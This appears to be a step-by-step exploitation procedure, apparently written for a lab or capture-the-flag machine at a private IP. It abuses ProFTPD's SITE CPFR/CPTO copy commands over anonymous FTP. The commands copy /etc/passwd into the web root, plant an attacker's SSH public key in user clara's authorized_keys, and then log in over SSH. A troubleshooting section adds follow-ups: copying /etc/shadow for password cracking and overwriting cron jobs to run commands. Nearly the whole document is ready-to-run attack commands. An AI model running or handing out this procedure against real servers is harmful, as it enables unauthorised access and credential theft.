TARGET: 10.12.0.42

===============================================
STEP-BY-STEP MANUAL PROCESS
===============================================

# STEP 1: Connect to FTP
-----------------------
ftp 10.12.0.42

# When prompted:
Username: anonymous
Password: anonymous


# STEP 2: Test SITE CPFR/CPTO (Copy /etc/passwd)
-----------------------
ftp> quote SITE CPFR /etc/passwd
ftp> quote SITE CPTO /var/www/html/passwd.txt
ftp> quit

# Then check: http://10.12.0.42/passwd.txt


# STEP 3: Upload SSH Public Key
-----------------------
# First, create your SSH key on your attacking machine:
ssh-keygen -t rsa
cat ~/.ssh/id_rsa.pub > /tmp/authorized_keys

# Connect and upload:
ftp 10.12.0.42
Name: anonymous
Password: anonymous
ftp> binary
ftp> put /tmp/authorized_keys
ftp> quit


# STEP 4: Copy authorized_keys to target user's .ssh
-----------------------
ftp 10.12.0.42
Name: anonymous
Password: anonymous
ftp> quote SITE CPFR /var/ftp/authorized_keys
ftp> quote SITE CPTO /home/clara/.ssh/authorized_keys
ftp> quit


# STEP 5: SSH into the target
-----------------------
ssh -i ~/.ssh/id_rsa clara@10.12.0.42

===============================================
TROUBLESHOOTING
===============================================

1. If connection times out:
   - Check network connectivity: ping 10.12.0.42
   - Check FTP port: nc -zv 10.12.0.42 21
   - Check firewall rules

2. If SITE commands fail:
   - Server may require authentication first
   - Try with different user credentials
   - Check ProFTPD version (must be < 1.3.3c)

3. If SSH fails:
   - .ssh directory may not exist: Try SITE MKDIR first
   - Wrong permissions: Should be 700 for .ssh, 600 for authorized_keys
   - Check SSH logs: tail -f /var/log/auth.log

4. Alternative exploitation:
   - Copy files to web directory and access via HTTP
   - Copy /etc/shadow for password cracking
   - Overwrite cron jobs for command execution
